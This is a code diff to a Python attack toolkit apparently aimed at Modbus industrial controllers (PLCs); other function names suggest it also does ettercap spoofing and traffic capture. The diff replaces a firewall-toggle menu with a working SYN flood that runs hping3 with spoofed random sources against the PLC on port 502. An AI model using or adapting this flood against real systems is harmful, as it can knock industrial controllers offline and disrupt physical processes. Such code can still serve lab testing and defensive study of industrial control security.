@@ -92,41 +92,38 @@ def etterspoof():
     time.sleep(1)
 
 def dos():
-    def firewall():
-        print("Selected DoS variation: Modbus Firewall\n")
-        print("Select a firewall state\n")
-        print("1) On (Blocking Traffic)")
-        print("2) Off (Return to default)")
-        print("q) Return to DoS Menu")
-        select = input(">> ")
-        
-        if select == "1":
-            subprocess.run(["iptables", "-A", "OUTPUT", "-p", "tcp", "-s", nm_config.modcli_ip, "--sport", nm_config.mod_port, "-j", "DROP"], check=True)
-            return
-        elif select == "2":
-            subprocess.run(["iptables", "-F"], check=True)
-            return
-        elif select == "q":
-            dos()
-        else:
-            firewall()
+
+    target = nm_config.modcli_ip
+    port = "502" # Standard Modbus TCP port
+
+    print(f"Targeting PLC at: {target}:{port}")
+    print("Status: Flooding with spoofed SYN packets...")
+
+    cmd = [
+        "hping3", "-S", "--flood", "-p", port, "--rand-source", target
+    ]
 
     try:
-        print("Selected option: DoS Attack\n")
-        print("1) SYN Flood\n2) Modbus Firewall\nq) Return")
-        select = input(">> ")
-        if select == "1":
-            print("Coming Soon!")
-            time.sleep(1)
-            dos()
-        elif select == "2":
-            firewall()
-        elif select == "q":
-            return
-        else:
-            return
-    except KeyboardInterrupt:
-        return
+        proc = subprocess.Popen(
+            cmd, 
+            stdout=subprocess.DEVNULL, 
+            stderr=subprocess.DEVNULL
+        )
+
+        print(f"\n[!] FLOODING TARGET {target}")
+        
+        input("\nPress [Enter] to STOP the attack and return to menu...")
+        
+        proc.terminate()
+        os.system("pkill -9 hping3 > /dev/null 2>&1")
+        
+        print("\n[+] Attack stopped. Recovery initiated.")
+        time.sleep(1)
+
+    except Exception as e:
+        print(f"\n[!] Error launching hping3: {e}")
+        print("Ensure hping3 is installed.")
+        time.sleep(2)
 
 def traffic():
     def capture(packet):
@@ -399,7 +396,6 @@ def main():
     # Use a loop to keep the menu alive without recursion
     while True:
         clear()
-        os.system("pkill -9 ettercap > /dev/null 2>&1")
         print(""" 
 ---------------------------------------------
        __   __   __        __  ___  ___  __  
